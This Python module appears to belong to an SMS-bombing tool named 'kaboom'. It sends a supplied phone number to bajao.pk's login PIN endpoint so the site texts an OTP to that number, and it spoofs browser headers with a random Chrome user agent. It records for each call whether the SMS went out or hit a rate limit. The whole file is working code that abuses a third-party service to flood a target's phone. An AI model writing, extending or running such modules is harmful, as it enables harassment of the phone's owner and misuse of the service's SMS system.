from kaboom.core import *
from kaboom.localuseragent import *

async def bajao(phone, client, out):
    name = "bajao"
    domain = "bajao.pk"
    frequent_rate_limit = False

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': random.choice(ua["browsers"]["chrome"]),   # core.py has "import random" and we imported core.py so we can use random.anyfunction, we are importing * for this 
        'Origin': 'https://bajao.pk',
        'Referer': 'https://bajao.pk/linkAccount'
    }

    # Bajao's linkAccount JS sends the raw input as uuid. Its auto-filled
    # MSISDN strips the 92 prefix, so 923001234567 becomes 3001234567.
    msisdn = phone[-10:]

    try:
        response = await client.post(
            'https://bajao.pk/api/v2/login/generatePinV2?siteid=&selOperator=2',
            headers=headers,
            data={'uuid': msisdn}
        )
        response_data = response.json()

        if not isinstance(response_data, dict):
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True, "reason": "invalid response"})
            return None

        message = str(response_data.get("msg") or response_data.get("message") or "").strip()
        status = str(response_data.get("status") or response_data.get("success") or "").lower()
        message_lower = message.lower()

        if (
            message in ("PIN has been sent via SMS to your phone number", "success")
            or "pin has been sent" in message_lower
            or "otp" in message_lower and "sent" in message_lower
            or status in ("success", "true", "1")
        ):
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": True, "error": False})
            return None

        if any(token in message_lower for token in ("too many", "rate", "limit", "wait", "try again later")):
            out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": True, "sent": False, "error": False, "reason": message or "rate limited"})
            return None

        reason = message or response_data.get("error") or "otp request failed"
        if reason == msisdn:
            reason = "service rejected this phone number"
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True, "reason": reason})
        return None

    except Exception as exc:
        out.append({"name": name, "domain": domain, "frequent_rate_limit": frequent_rate_limit, "rateLimit": False, "sent": False, "error": True, "reason": str(exc) or type(exc).__name__})
        return None
